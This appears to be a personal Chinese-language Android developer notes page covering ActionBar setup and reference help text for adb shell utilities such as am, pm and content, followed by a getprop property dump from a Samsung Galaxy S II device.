---
title: android_7788
tags:
---
<!-- toc -->
# ActionBar
 * 3.0+
 * 3.0-可以看看: http://actionbarsherlock.com/index.html
# Action Bar 的三种类型
 * Tabbed Action Bar
 * List Action Bar
 * Standard Action Bar
# 组成部分
||= Home Icon Area    =||=  Title Area =||= Tabs Area =||= Action Icon Area =||= Menu Icon Area =||
|| android.R.id.home   ||               ||           ||                  ||                ||
# 1. HomeIcon区域
# 2. Titlte区域
# 3. Tabs区域
ActionBar导航模式为Tab时，此区域显示Tab标签，列表模式时为列表。 标准模式时，此区域空白。
# 4. 
# Layout Considerations for Split Action Bars
```xml
        <activity
            android:name=".SplitActionItems"
            android:label="@string/split"
            android:uiOptions="splitActionBarWhenNarrow" >
            ...
        </activity>
```
 1. Main action bar
 2. Top bar
 3. Bottom bar
[[Image(http://developer.android.com/design/media/action_bar_pattern_considerations.png)]]
# Contextual Action Bars
[[Image(http://developer.android.com/design/media/action_bar_cab.png)]]
# View Controls
# 使用ActionBar
 * android:targetSdkVersion设置为11+时即可启用ActionBar, 在11+平台上，你的OptionMenu会变身为ActionBar
 * 因为ActionBar上面的空间有限，所以接下来需要对OptionMenu做些额外的配置.
```xml
<manifest ... >
    <uses-sdk android:minSdkVersion="4"
              android:targetSdkVersion="11" />
    ...
</manifest>
```
# 设置android:showAsAction属性 
 * `always` : OptionMenu将总是显示在ActionBar上
 * `ifRoom` : 如果有空间就显示在ActionBar上
 * `never`  : 不要在ActionBar上显示(以OverflowMenu形式调出)
这三个属性，代表了按钮的重要程度。always有较高的优先级，设置为always的按钮总是尽可能显示到ActionBar上，这意味着如果ActionBar上的按钮不断增加，ifRoom会被always一个一个挤掉。
 * withText : 同时显示Menu的title
```div class=warn
It's important that you always define android:title for each menu item?even if you don't declare that the title appear with the action item?for three reasons:
# 注意
menuItem一定要设置`android:title`属性, 因为:
 1. 如果ActionBar上空间不足，剩下的MenuItem中，只有设置了android:title属性的才会被退而求其次的显示为OverflowMenu
 2. 很多用户更习惯通过文字而非图标了解MenuItem的功用.
 3. 如果MenuItem仅以图标方式显示，长按图标可以显示MenuItem的title,这对喜爱图标，但是偶尔又搞不清楚功能的用户是非常友善的帮助。
Read more: http://www.intertech.com/Blog/Post/Android-Action-Bar-from-the-Options-Menu.aspx#ixzz2DHS3Itnt       
```
# 处理按钮点击
 1. 可以使用'public boolean onOptionsItemSelected(MenuItem item) { ... }`
 2. 也可以在menu.item中的`android:onClick`属性中指定回调函数
 3. Home图标的id为系统定义:`android.R.id.home`
# 不想使用ActionBar
Android定义了没有ActionBar的主题，你需要在对应的Activity里设置一下:
```sh
<activity
    android:label="@string/app_name"
    android:name=".Main" 
    android:theme="@android:style/Theme.Holo.NoActionBar">
```
当然通过程序也可以达到相同的目的:
```java
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);
    ActionBar bar = getActionBar();
    bar.hide();
}
```
# 自定义ActionBar
# 参考
 * http://developer.android.com/design/patterns/actionbar.html
[[TOC]]
# Android Adb =
# chown
```sh
$ chown root.shell <path>
```
# shell ==
```
$ adb shell su -c '<command>'
```
# shell + ps
```
```
# shell + am ==
am可以启动Activity, 向Receiver广播消息
```
usage: am [subcommand] [options]
    start an Activity: am start [-D] <INTENT>
        -D: enable debugging
    send a broadcast Intent: am broadcast <INTENT>
    start an Instrumentation: am instrument [flags] <COMPONENT>
        -r: print raw results (otherwise decode REPORT_KEY_STREAMRESULT)
        -e <NAME> <VALUE>: set argument <NAME> to <VALUE>
        -p <FILE>: write profiling data to <FILE>
        -w: wait for instrumentation to finish before returning
    start profiling: am profile <PROCESS> start <FILE>
    stop profiling: am profile <PROCESS> stop
    <INTENT> specifications include these flags:
        [-a <ACTION>] [-d <DATA_URI>] [-t <MIME_TYPE>]
        [-c <CATEGORY> [-c <CATEGORY>] ...]
        [-e|--es <EXTRA_KEY> <EXTRA_STRING_VALUE> ...]
        [--ez <EXTRA_KEY> <EXTRA_BOOLEAN_VALUE> ...]
        [-e|--ei <EXTRA_KEY> <EXTRA_INT_VALUE> ...]
        [-n <COMPONENT>] [-f <FLAGS>] [<URI>]
```
示例:
```
#!sh
# 启动com.pansi.xmpp的Main Activity
$ adb shell am start -n com.pansi.xmpp/.Main
# 启动浏览器访问www.google.com
$ adb shell am start http://www.google.com
# 携带参数
$ adb shell am broadcast -a cn.labs.intent.action.ACTION_UPLOAD_UPDATE_PROGRESS --ei extra_progress 4
```
Intent { act=cn.labs.intent.action.ACTION_UPLOAD_BASE_DATA_START cmp=cn.labs/.service.MainService 
# 常见问题
# java.lang.SecurityException: Permission Denial
假如有个应用是这样的:
```xml
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="org.amas.app" >
    ...
    <application>
        <activity
            android:name=".ui.Main">
            <intent-filter>
                <action android:name="org.amas.app.ACTION_PREVIEW" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```
```sh
# 用am启动Main, 咋不好使呢???
$ adb shell am start -n org.amas.app/.ui.Main
Starting: Intent { cmp=org.amas.app/.ui.Main }
java.lang.SecurityException: Permission Denial: starting Intent { flg=0x10000000 cmp=org.amas.app/.ui.Main } from null (pid=30001, uid=2000) requires null
```
解决方法: 将`android:debuggable`设置为`true`
```xml
    <application
        ...
        android:debuggable="true"
        ...>
```
# am
```
usage: am [subcommand] [options]
usage: am start [-D] [-W] [-P <FILE>] [--start-profiler <FILE>]
               [--R COUNT] [-S] [--opengl-trace] <INTENT>
       am startservice <INTENT>
       am force-stop <PACKAGE>
       am kill <PACKAGE>
       am kill-all
       am broadcast <INTENT>
       am instrument [-r] [-e <NAME> <VALUE>] [-p <FILE>] [-w]
               [--no-window-animation] <COMPONENT>
       am profile start <PROCESS> <FILE>
       am profile stop [<PROCESS>]
       am dumpheap [flags] <PROCESS> <FILE>
       am set-debug-app [-w] [--persistent] <PACKAGE>
       am clear-debug-app
       am monitor [--gdb <port>]
       am screen-compat [on|off] <PACKAGE>
       am display-size [reset|MxN]
       am to-uri [INTENT]
       am to-intent-uri [INTENT]
```
# am start [-D!|-W]
start an Activity.  Options are:
    * -D: enable debugging
    * -W: wait for launch to complete
    * --start-profiler <FILE>: start profiler and send results to <FILE>
    * -P <FILE>: like above, but profiling stops when app goes idle
    * -R: repeat the activity launch <COUNT> times.  Prior to each repeat, the top activity will be finished.
    * -S: force stop the target app before starting the activity
    * --opengl-trace: enable tracing of OpenGL functions
# am startservice: start a Service.
# am force-stop <package>
force stop everything associated with <PACKAGE>.
# am kill <package>
Kill all processes associated with <PACKAGE>.  Only kills.
processes that are safe to kill -- that is, will not impact the user experience.
# am kill-all
Kill all background processes.
# am broadcast
send a broadcast Intent.
# am instrument: start an Instrumentation.  Typically this target <COMPONENT>
  is the form <TEST_PACKAGE>/<RUNNER_CLASS>.  Options are:
    -r: print raw results (otherwise decode REPORT_KEY_STREAMRESULT).  Use with
        [-e perf true] to generate raw output for performance measurements.
    -e <NAME> <VALUE>: set argument <NAME> to <VALUE>.  For test runners a
        common form is [-e <testrunner_flag> <value>[,<value>...]].
    -p <FILE>: write profiling data to <FILE>
    -w: wait for instrumentation to finish before returning.  Required for
        test runners.
    --no-window-animation: turn off window animations will running.
# am profile
start and stop profiler on a process.
# am dumpheap
dump the heap of a process.  Options are:
    * -n: dump native heap instead of managed heap
# am set-debug-app <package>
set application <PACKAGE> to debug.  Options are:
    * -w: wait for debugger when application starts
    * --persistent: retain this value
# am clear-debug-app: clear the previously set-debug-app.
# am monitor: start monitoring for crashes or ANRs.
    --gdb: start gdbserv on the given port at crash/ANR
# am screen-compat: control screen compatibility mode of <PACKAGE>.
# am display-size: override display size.
# am to-uri: print the given Intent specification as a URI.
# am to-intent-uri
print the given Intent specification as an intent: URI.
```div class=note
<INTENT> specifications include these flags and arguments:
  * -a <action>
  * -d <url>
  * -t <mime-type>
  * -e !| --es: <key><string>
  * --esn: <key>
  * --ez: <key> <boolean>
  * --ei: <key> <int>
  * --el: <key> <long>
  * --ef: <key> <float>
  * --eu: <key> <url>
  * --ecn: <key> <component-name>
  * --eia: <key> <int>,<int>,...,<int>
  * --ela: <key> <long>,<long>,...,<long>
  * --efa: <key> <float>,<float>,...,<float>
  * -n: <component>
  * -f: <flags>
     * [--grant-read-uri-permission] 
     * [--grant-write-uri-permission]
     * [--debug-log-resolution] 
     * [--exclude-stopped-packages]
     * [--include-stopped-packages]
     * [--activity-brought-to-front] 
     * [--activity-clear-top]
     * [--activity-clear-when-task-reset] 
     * [--activity-exclude-from-recents]
     * [--activity-launched-from-history]
     * [--activity-multiple-task]
     * [--activity-no-animation] 
     * [--activity-no-history]
     * [--activity-no-user-action]
     * [--activity-previous-is-top]
     * [--activity-reorder-to-front] 
     * [--activity-reset-task-if-needed]
     * [--activity-single-top] 
     * [--activity-clear-task]
     * [--activity-task-on-home]
     * [--receiver-registered-only] 
     * [--receiver-replace-pending]
     * [--selector]
----
    [-a <ACTION>] [-d <DATA_URI>] [-t <MIME_TYPE>]
    [-c <CATEGORY> [-c <CATEGORY>] ...]
    [-e|--es <EXTRA_KEY> <EXTRA_STRING_VALUE> ...]
    [--esn <EXTRA_KEY> ...]
    [--ez <EXTRA_KEY> <EXTRA_BOOLEAN_VALUE> ...]
    [--ei <EXTRA_KEY> <EXTRA_INT_VALUE> ...]
    [--el <EXTRA_KEY> <EXTRA_LONG_VALUE> ...]
    [--ef <EXTRA_KEY> <EXTRA_FLOAT_VALUE> ...]
    [--eu <EXTRA_KEY> <EXTRA_URI_VALUE> ...]
    [--ecn <EXTRA_KEY> <EXTRA_COMPONENT_NAME_VALUE>]
    [--eia <EXTRA_KEY> <EXTRA_INT_VALUE>[,<EXTRA_INT_VALUE...]]
    [--ela <EXTRA_KEY> <EXTRA_LONG_VALUE>[,<EXTRA_LONG_VALUE...]]
    [--efa <EXTRA_KEY> <EXTRA_FLOAT_VALUE>[,<EXTRA_FLOAT_VALUE...]]
    [-n <COMPONENT>] [-f <FLAGS>]
    [--grant-read-uri-permission] [--grant-write-uri-permission]
    [--debug-log-resolution] [--exclude-stopped-packages]
    [--include-stopped-packages]
    [--activity-brought-to-front] [--activity-clear-top]
    [--activity-clear-when-task-reset] [--activity-exclude-from-recents]
    [--activity-launched-from-history] [--activity-multiple-task]
    [--activity-no-animation] [--activity-no-history]
    [--activity-no-user-action] [--activity-previous-is-top]
    [--activity-reorder-to-front] [--activity-reset-task-if-needed]
    [--activity-single-top] [--activity-clear-task]
    [--activity-task-on-home]
    [--receiver-registered-only] [--receiver-replace-pending]
    [--selector]
    [<URI> | <PACKAGE> | <COMPONENT>]
```
# pm
```
usage: pm list packages [-f] [-d] [-e] [-s] [-3] [-i] [-u] [FILTER]
       pm list permission-groups
       pm list permissions [-g] [-f] [-d] [-u] [GROUP]
       pm list instrumentation [-f] [TARGET-PACKAGE]
       pm list features
       pm list libraries
       pm path PACKAGE
       pm install [-l] [-r] [-t] [-i INSTALLER_PACKAGE_NAME] [-s] [-f]
                  [--algo <algorithm name> --key <key-in-hex> --iv <IV-in-hex>] PATH
       pm uninstall [-k] PACKAGE
       pm clear PACKAGE
       pm enable PACKAGE_OR_COMPONENT
       pm disable PACKAGE_OR_COMPONENT
       pm disable-user PACKAGE_OR_COMPONENT
       pm grant PACKAGE PERMISSION
       pm revoke PACKAGE PERMISSION
       pm set-install-location [0/auto] [1/internal] [2/external]
       pm get-install-location
       pm set-permission-enforced PERMISSION [true|false]
```
# pm list packages
prints all packages, optionally only those whose package name contains the text in FILTER.  Options:
    * -f: see their associated file.
    * -d: filter to only show disbled packages.
    * -e: filter to only show enabled packages.
    * -s: filter to only show system packages.
    * -3: filter to only show third party packages.
    * -i: see the installer for the packages.
    * -u: also include uninstalled packages.
# pm list permission-groups
prints all known permission groups.
# pm list permissions
prints all known permissions, optionally only. those in GROUP.  Options:
    * -g: organize by group.
    * -f: print all information.
    * -s: short summary.
    * -d: only list dangerous permissions.
    * -u: list only the permissions users will see.
# pm list instrumentation
use to list all test packages; optionally supply <TARGET-PACKAGE> to list the test packages for a particular application.  Options:
   * -f: list the .apk file for the test package.
# pm list features
prints all features of the system.
# pm path <package>
print the path to the .apk of the given PACKAGE.
# pm install <apk>
installs a package to the system.  Options:
    * -l: install the package with FORWARD_LOCK.
    * -r: reinstall an exisiting app, keeping its data.
    * -t: allow test .apks to be installed.
    * -i: specify the installer package name.
    * -s: install package on sdcard.
    * -f: install package on internal flash.
# pm uninstall <package>
removes a package from the system. Options:
    * -k: keep the data and cache directories around after package removal.
# pm clear
deletes all data associated with a package.
# pm [enable|disable|disable-user] <package/component>
these commands change the enabled state of a given package or component (written as "package/class").
# pm [grant|revoke] 
these commands either grant or revoke permissions to applications.  Only optional permissions the application has declared can be granted or revoked.
# pm get-install-location <package>
returns the current install location.
    * 0 [auto]: Let system decide the best location
    * 1 [internal]: Install on internal device storage
    * 2 [external]: Install on external media
# pm set-install-location
changes the default install location.
```div class=note
NOTE: this is only intended for debugging; using this can cause applications to break and other undersireable behavior.
```
   * 0 [auto]: Let system decide the best location
   * 1 [internal]: Install on internal device storage
   * 2 [external]: Install on external media
# service
Usage: service [-h|-?]
       service list
       service check SERVICE
       service call SERVICE CODE [i32 INT | s16 STR] ...
Options:
   i32: Write the integer INT into the send parcel.
   s16: Write the UTF-16 string STR into the send parcel
# ime
```
usage: ime list [-a] [-s]
       ime enable ID
       ime disable ID
       ime set ID
The list command prints all enabled input methods.  Use
the -a option to see all input methods.  Use
the -s option to see only a single summary line of each.
The enable command allows the given input method ID to be used.
The disable command disallows the given input method ID from use.
The set command switches to the given input method ID.
```
# bugreport
# input
```                                                   
usage: input ...
       input text <string>
       input keyevent <key code number or name>
       input tap <x> <y>
       input swipe <x1> <y1> <x2> <y2>
```
# screenshot
```                                                  
usage: screenshot [-s soundfile] filename.png
   -s: play a sound effect to signal success
   -i: autoincrement to avoid overwriting filename.png
```
# svc
```
Available commands:
    help     Show information about the subcommands
    power    Control the power manager
    data     Control mobile data connectivity
    wifi     Control the Wi-Fi manager
    usb      Control Usb state
```
# content
```
usage: adb shell content [subcommand] [options]
usage: adb shell content insert --uri <URI> --bind <BINDING> [--bind <BINDING>...]
  <URI> a content provider URI.
  <BINDING> binds a typed value to a column and is formatted:
  <COLUMN_NAME>:<TYPE>:<COLUMN_VALUE> where:
  <TYPE> specifies data type such as:
  b - boolean, s - string, i - integer, l - long, f - float, d - double
  Note: Omit the value for passing an empty string, e.g column:s:
  Example:
  # Add "new_setting" secure setting with value "new_value".
  adb shell content insert --uri content://settings/secure --bind name:s:new_setting --bind value:s:new_value
usage: adb shell content update --uri <URI> [--where <WHERE>]
  <WHERE> is a SQL style where clause in quotes (You have to escape single quotes - see example below).
  Example:
  # Change "new_setting" secure setting to "newer_value".
  adb shell content update --uri content://settings/secure --bind value:s:newer_value --where "name='new_setting'"
usage: adb shell content delete --uri <URI> --bind <BINDING> [--bind <BINDING>...] [--where <WHERE>]
  Example:
  # Remove "new_setting" secure setting.
  adb shell content delete --uri content://settings/secure --where "name='new_setting'"
usage: adb shell content query --uri <URI> [--projection <PROJECTION>] [--where <WHERE>] [--sort <SORT_ORDER>]
  <PROJECTION> is a list of colon separated column names and is formatted:
  <COLUMN_NAME>[:<COLUMN_NAME>...]
  <SORT_OREDER> is the order in which rows in the result should be sorted.
  Example:
  # Select "name" and "value" columns from secure settings where "name" is equal to "new_setting" and sort the result by name in ascending order.
  adb shell content query --uri content://settings/secure --projection name:value --where "name='new_setting'" --sort "name ASC"
```
# app_process
```
app_process                                                   
Error: no class name or --zygote supplied.
Usage: app_process [java-options] cmd-dir start-class-name [options
```
# bmgr
```
usage: bmgr [backup|restore|list|transport|run]
       bmgr backup PACKAGE
       bmgr enable BOOL
       bmgr enabled
       bmgr list transports
       bmgr list sets
       bmgr transport WHICH
       bmgr restore TOKEN
       bmgr restore TOKEN PACKAGE...
       bmgr restore PACKAGE
       bmgr run
       bmgr wipe PACKAGE
The 'backup' command schedules a backup pass for the named package.
Note that the backup pass will effectively be a no-op if the package
does not actually have changed data to store.
The 'enable' command enables or disables the entire backup mechanism.
If the argument is 'true' it will be enabled, otherwise it will be
disabled.  When disabled, neither backup or restore operations will
be performed.
The 'enabled' command reports the current enabled/disabled state of
the backup mechanism.
The 'list transports' command reports the names of the backup transports
currently available on the device.  These names can be passed as arguments
to the 'transport' command.  The currently selected transport is indicated
with a '*' character.
The 'list sets' command reports the token and name of each restore set
available to the device via the current transport.
The 'transport' command designates the named transport as the currently
active one.  This setting is persistent across reboots.
The 'restore' command when given just a restore token initiates a full-system
restore operation from the currently active transport.  It will deliver
the restore set designated by the TOKEN argument to each application
that had contributed data to that restore set.
The 'restore' command when given a token and one or more package names
initiates a restore operation of just those given packages from the restore
set designated by the TOKEN argument.  It is effectively the same as the
'restore' operation supplying only a token, but applies a filter to the
set of applications to be restored.
The 'restore' command when given just a package name intiates a restore of
just that one package according to the restore set selection algorithm
used by the RestoreSession.restorePackage() method.
The 'run' command causes any scheduled backup operation to be initiated
immediately, without the usual waiting period for batching together
data changes.
The 'wipe' command causes all backed-up data for the given package to be
erased from the current transport's storage.  The next backup operation
that the given application performs will rewrite its entire data set.
```
# sdcard
```
usage: sdcard [-l -f] <path> <uid> <gid>
        -l force file names to lower case when creating new files
        -f fix up file system before starting (repairs bad file name case and group ownership)
```
# wipe
```
wipe <system|data|all>
system means '/system'
data means '/dat
```
# run-as
```
Usage: run-as <package-name> <command> [<args>]
```
# uiautomator
```
Usage: uiautomator <subcommand> [options]
Available subcommands:
help: displays help message
runtest: executes UI automation tests
    runtest <class spec> [options]
    <class spec>: <JARS> [-c <CLASSES> | -e class <CLASSES>]
      <JARS>: a list of jar file containing test classes and dependencies. If
        the path is relative, it's assumed to be under /data/local/tmp. Use
        absolute path if the file is elsewhere. Multiple files can be
        specified, separated by space.
      <CLASSES>: a list of test class names to run, separated by comma. To
        a single method, use TestClass#testMethod format. The -e or -c option
        may be repeated.
    options:
      --nohup: trap SIG_HUP, so test won't terminate even if parent process
               is terminated, e.g. USB is disconnected.
      -e debug [true|false]: wait for debugger to connect before starting.
      -e runner [CLASS]: use specified test runner class instead. If
        unspecified, framework default runner will be used.
      -e <NAME> <VALUE>: other name-value pairs to be passed to test classes.
        May be repeated.
dump: creates an XML dump of current UI hierarchy
    dump [file]
      [file]: the location where the dumped XML should be stored, default is
      /mnt/sdcard/window_dump.xml
events: prints out accessibility events until terminated
```
# stream
# sendevent
 * http://blog.csdn.net/kickxxx/article/details/7482392
# getevent
# vdc
# 参考
```
adb
am
app_process
applypatch
applypatch_static
asan
asanwrapper
atrace
audioloop
bmgr
bootanimation
bu
bugreport
cat
check_prereq
chmod
chown
cmp
codec
content
corrupt_gdt_free_blocks
dalvikvm
date
dd
debuggerd
decoder
dexopt
df
dhcpcd
dmesg
drmserver
dumpstate
dumpsys
flash_image
fsck_msdos
gdbjithelper
gdbserver
getevent
getprop
gzip
hd
id
ifconfig
iftop
ime
input
insmod
installd
ioctl
ionice
ip6tables
iptables
keystore
keystore_cli
kill
linker
ln
log
logcat
logwrapper
ls
lsmod
lsof
make_ext4fs
md5
mdnsd
mediaserver
mkdir
mksh
monkey
mount
mtpd
mv
nandread
ndc
netcfg
netd
netstat
newfs_msdos
notify
ping
ping6
pm
pppd
printenv
ps
qemu-props
qemud
r
racoon
radiooptions
reboot
record
recordvideo
recovery
renice
requestsync
rild
rm
rmdir
rmmod
route
run-as
schedtest
schedtop
screencap
screenshot
sdcard
sendevent
sensorservice
service
servicemanager
set_ext4_err_bit
setconsole
setprop
sf2
sh
showlease
skia_test
sleep
smd
stagefright
start
stop
stream
surfaceflinger
svc
sync
system_server
testid3
toolbox
top
touch
uiautomator
uim-sysfs
umount
updater
uptime
vdc
vmstat
vold
watchprops
wipe
```
# getprop
```
[audio.country]: [0]
[audioflinger.bootsnd]: [1]
[dalvik.vm.dexopt-flags]: [m=y]
[dalvik.vm.heapgrowthlimit]: [128m]
[dalvik.vm.heapsize]: [128m]
[dalvik.vm.heapstartsize]: [5m]
[dalvik.vm.stack-trace-file]: [/data/anr/traces.txt]
[dev.bootcomplete]: [1]
[dev.powersave_fps]: [0]
[dev.sfbootcomplete]: [1]
[dhcp.wlan0.dns1]: [192.168.1.1]
[dhcp.wlan0.dns2]: []
[dhcp.wlan0.dns3]: []
[dhcp.wlan0.dns4]: []
[dhcp.wlan0.gateway]: [192.168.1.1]
[dhcp.wlan0.ipaddress]: [192.168.1.105]
[dhcp.wlan0.leasetime]: [7200]
[dhcp.wlan0.mask]: [255.255.255.0]
[dhcp.wlan0.pid]: [487]
[dhcp.wlan0.reason]: [BOUND]
[dhcp.wlan0.result]: [ok]
[dhcp.wlan0.server]: [192.168.1.1]
[drm.service.enable]: [true]
[gsm.current.phone-type]: [1]
[gsm.network.type]: [UMTS:3]
[gsm.operator.alpha]: []
[gsm.operator.iso-country]: [cn]
[gsm.operator.isroaming]: [false]
[gsm.operator.numeric]: [46001]
[gsm.sim.operator.alpha]: []
[gsm.sim.operator.iso-country]: []
[gsm.sim.operator.numeric]: []
[gsm.sim.state]: [ABSENT]
[gsm.version.baseband]: [I9100GZCLPL]
[gsm.version.ril-impl]: [Samsung RIL(IPC) v2.0]
[gsm.wifiConnected.active]: [true]
[hwui.render_dirty_regions]: [false]
[init.svc.DR-deamon]: [running]
[init.svc.TvoutService_C]: [running]
[init.svc.adbd]: [running]
[init.svc.dbus]: [running]
[init.svc.debuggerd]: [running]
[init.svc.dhcpcd_wlan0]: [running]
[init.svc.drm]: [running]
[init.svc.fRom]: [stopped]
[init.svc.flash_recovery]: [stopped]
[init.svc.immvibed]: [stopped]
[init.svc.installd]: [running]
[init.svc.keystore]: [running]
[init.svc.macloader]: [stopped]
[init.svc.media]: [running]
[init.svc.mobex-daemon]: [running]
[init.svc.netd]: [running]
[init.svc.playsound]: [stopped]
[init.svc.pvrsrvinit]: [stopped]
[init.svc.ril-daemon]: [running]
[init.svc.samsungani]: [stopped]
[init.svc.servicemanager]: [running]
[init.svc.smc_pa_wvdrm]: [stopped]
[init.svc.surfaceflinger]: [running]
[init.svc.tf_daemon]: [restarting]
[init.svc.vold]: [running]
[init.svc.wpa_supplicant]: [running]
[init.svc.zygote]: [running]
[keyguard.no_require_sim]: [true]
[net.bt.name]: [Android]
[net.change]: [net.dnschange]
[net.dns1]: [192.168.1.1]
[net.dnschange]: [1]
[net.hostname]: [android-96c305608e07ca3]
[net.qtaguid_enabled]: [1]
[net.rmnet0.dns1]: []
[net.rmnet0.dns2]: []
[net.rmnet0.gw]: []
[net.tcp.buffersize.default]: [4096,87380,110208,4096,16384,110208]
[net.tcp.buffersize.edge]: [4093,26280,35040,4096,16384,35040]
[net.tcp.buffersize.gprs]: [4092,8760,11680,4096,8760,11680]
[net.tcp.buffersize.umts]: [4094,87380,110208,4096,16384,110208]
[net.tcp.buffersize.wifi]: [4095,87380,110208,4096,16384,110208]
[net.wlan0.dns1]: [49.0.0.0]
[net.wlan0.dns2]: []
[persist.hwc.docking.enabled]: [0]
[persist.sys.camera.connect]: [0]
[persist.sys.camera.transform]: [0]
[persist.sys.country]: [CN]
[persist.sys.hdmi.on]: [0]
[persist.sys.language]: [zh]
[persist.sys.localevar]: []
[persist.sys.mirroring.transform]: [0]
[persist.sys.profiler_ms]: [0]
[persist.sys.storage_preload]: [2]
[persist.sys.strictmode.disable]: [true]
[persist.sys.strictmode.visual]: [false]
[persist.sys.timezone]: [Asia/Shanghai]
[persist.sys.usb.config]: [mtp,adb]
[ril.FS]: [false]
[ril.ICC_TYPE]: [0]
[ril.RildInit]: [1]
[ril.approved_codever]: [none]
[ril.approved_cscver]: [none]
[ril.approved_modemver]: [none]
[ril.barcode]: []
[ril.ecclist0]: [112,911,08,000,110,999,118,119]
[ril.encrypt_customer]: [4A81D3AA37FA5774F8A86626D2661B67]
[ril.hw_ver]: [MP 0.900]
[ril.model_id]: [I9100G]
[ril.official_cscver]: [I9100GOZHLPL]
[ril.prl_num]: [0]
[ril.product_code]: [GT-I9100LKGCHN]
[ril.rfcal_date]: [2012.11.1]
[ril.sales_code]: [CHN]
[ril.serialnumber]: [00000000000]
[ril.sw_ver]: [I9100GZCLPL]
[ril.tethering.usb.active]: [0]
[ril.timezoneID]: [Asia/Harbin]
[rild.libargs]: [-d /dev/ttyS0]
[rild.libpath]: [/system/lib/libsec-ril.so]
[ro.adb.qemud]: [1]
[ro.allow.mock.location]: [0]
[ro.baseband]: [unknown]
[ro.board.platform]: [omap4]
[ro.bootloader]: [unknown]
[ro.bootmode]: [power_key]
[ro.bt.bdaddr_path]: [/efs/bluetooth/bt_addr]
[ro.build.PDA]: [I9100GZCLPL]
[ro.build.changelist]: [1067026]
[ro.build.characteristics]: [phone]
[ro.build.date.utc]: [1349414895]
[ro.build.date]: [Fri Oct  5 14:28:15 KST 2012]
[ro.build.description]: [GT-I9100G-user 4.0.4 IMM76D ZCLPL release-keys]
[ro.build.display.id]: [IMM76D.ZCLPL]
[ro.build.fingerprint]: [samsung/GT-I9100G/GT-I9100G:4.0.4/IMM76D/ZCLPL:user/release-keys]
[ro.build.hidden_ver]: [I9100GZCLPL]
[ro.build.host]: [SEP-88]
[ro.build.id]: [IMM76D]
[ro.build.product]: [GT-I9100G]
[ro.build.tags]: [release-keys]
[ro.build.type]: [user]
[ro.build.user]: [se.infra]
[ro.build.version.codename]: [REL]
[ro.build.version.incremental]: [ZCLPL]
[ro.build.version.release]: [4.0.4]
[ro.build.version.sdk]: [15]
[ro.camera.sound.forced]: [1]
[ro.carrier]: [unknown]
[ro.com.android.dataroaming]: [false]
[ro.com.android.dateformat]: [MM-dd-yyyy]
[ro.com.google.clientidbase]: [android-samsung]
[ro.com.google.locationfeatures]: [1]
[ro.config.alarm_alert]: [Good_Morning.ogg]
[ro.config.media_sound]: [Media_preview_Touch_the_light.ogg]
[ro.config.notification_sound]: [S_Whistle.ogg]
[ro.config.ringtone]: [S_Over_the_horizon.ogg]
[ro.crypto.fs_flags]: [0x00000406]
[ro.crypto.fs_mnt_point]: [/data]
[ro.crypto.fs_options]: [noauto_da_alloc]
[ro.crypto.fs_real_blkdev]: [/dev/block/mmcblk0p10]
[ro.crypto.fs_type]: [ext4]
[ro.crypto.keyfile.userdata]: [/efs/metadata]
[ro.crypto.state]: [unencrypted]
[ro.csc.country_code]: [China]
[ro.csc.sales_code]: [CHN]
[ro.debuggable]: [0]
[ro.error.receiver.default]: [com.samsung.receiver.error]
[ro.factorytest]: [0]
[ro.hardware]: [t1]
[ro.kernel.qemu]: [0]
[ro.opengles.version]: [131072]
[ro.product.board]: [tuna]
[ro.product.brand]: [samsung]
[ro.product.cpu.abi2]: [armeabi]
[ro.product.cpu.abi]: [armeabi-v7a]
[ro.product.device]: [GT-I9100G]
[ro.product.locale.language]: [en]
[ro.product.locale.region]: [US]
[ro.product.manufacturer]: [samsung]
[ro.product.model]: [GT-I9100G]
[ro.product.name]: [GT-I9100G]
[ro.radio.noril]: [yes]
[ro.revision]: [0]
[ro.ril.gprsclass]: [10]
[ro.ril.hsxpa]: [1]
[ro.runtime.firstboot]: [947145472702]
[ro.secdirenc]: [true]
[ro.secfulldirenc]: [true]
[ro.secsddecryption]: [true]
[ro.secure]: [1]
[ro.serialno]: [c009013137aa5af]
[ro.setupwizard.mode]: [DISABLED]
[ro.sf.lcd_density]: [240]
[ro.tether.denied]: [false]
[ro.url.legal.android_privacy]: [http://www.google.com/intl/%s/mobile/android/basic/privacy.html]
[ro.url.legal]: [http://www.google.com/intl/%s/mobile/android/basic/phone-legal.html]
[ro.wifi.channels]: []
[sys.boot_completed]: [1]
[sys.ccr]: [false]
[sys.settings_system_version]: [3]
[sys.usb.config]: [mtp,adb]
[sys.usb.state]: [mtp,adb]
[system_init.startsurfaceflinger]: [0]
[vold.post_fs_data_done]: [1]
[wifi.interface]: [wlan0]
[wifi.supplicant_scan_interval]: [15]
[wlan.driver.status]: [ok]
$ adb shell getprop adb shell getprop ro.product.name                                                                                                                ~
$  adb shell getprop ro.product.name                                                                                                                             ~:[1]
GT-I9100G
$  adb shell getprop ro.product.name                                                                                                                                 ~
GT-I9100G
$  adb shell getprop                                                                                                                                                 ~
[audio.country]: [0]
[audioflinger.bootsnd]: [1]
[dalvik.vm.dexopt-flags]: [m=y]
[dalvik.vm.heapgrowthlimit]: [128m]
[dalvik.vm.heapsize]: [128m]
[dalvik.vm.heapstartsize]: [5m]
[dalvik.vm.stack-trace-file]: [/data/anr/traces.txt]
[dev.bootcomplete]: [1]
[dev.powersave_fps]: [0]
[dev.sfbootcomplete]: [1]
[dhcp.wlan0.dns1]: [192.168.1.1]
[dhcp.wlan0.dns2]: []
[dhcp.wlan0.dns3]: []
[dhcp.wlan0.dns4]: []
[dhcp.wlan0.gateway]: [192.168.1.1]
[dhcp.wlan0.ipaddress]: [192.168.1.105]
[dhcp.wlan0.leasetime]: [7200]
[dhcp.wlan0.mask]: [255.255.255.0]
[dhcp.wlan0.pid]: [487]
[dhcp.wlan0.reason]: [BOUND]
[dhcp.wlan0.result]: [ok]
[dhcp.wlan0.server]: [192.168.1.1]
[drm.service.enable]: [true]
[gsm.current.phone-type]: [1]
[gsm.network.type]: [UMTS:3]
[gsm.operator.alpha]: []
[gsm.operator.iso-country]: [cn]
[gsm.operator.isroaming]: [false]
[gsm.operator.numeric]: [46001]
[gsm.sim.operator.alpha]: []
[gsm.sim.operator.iso-country]: []
[gsm.sim.operator.numeric]: []
[gsm.sim.state]: [ABSENT]
[gsm.version.baseband]: [I9100GZCLPL]
[gsm.version.ril-impl]: [Samsung RIL(IPC) v2.0]
[gsm.wifiConnected.active]: [true]
[hwui.render_dirty_regions]: [false]
